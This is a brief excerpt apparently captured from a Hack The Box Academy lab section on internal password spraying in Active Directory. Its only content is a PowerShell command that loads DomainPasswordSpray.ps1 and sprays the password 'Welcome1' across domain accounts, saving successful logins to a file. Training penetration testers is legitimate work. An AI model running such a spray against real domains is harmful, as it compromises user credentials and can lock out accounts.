# Section 12: Internal Password Spraying - from Windows

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1422
- Code/command blocks: 1

> Terminal output is omitted; only commands & scripts are captured.

## 1. `powershell` _(output omitted)_

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

